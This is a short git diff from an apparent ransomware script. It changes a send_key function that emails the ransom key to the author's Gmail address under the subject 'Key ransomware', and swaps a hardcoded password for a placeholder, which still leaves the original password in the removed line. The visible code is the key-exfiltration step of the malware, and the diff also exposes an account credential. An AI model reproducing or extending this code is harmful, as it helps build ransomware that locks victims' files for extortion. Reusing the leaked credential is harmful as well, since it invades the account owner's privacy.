@@ -17,7 +17,7 @@ folders = [x for x in folders if not x.startswith('.')]
 def send_key():
     msg = MIMEMultipart()
     email = 'programming.fadn@gmail.com'
-    password = 'f42904558'
+    password = 'passwordhere'
     msg['From'] = email
     msg['To'] = email
     msg['Subject'] = 'Key ransomware'
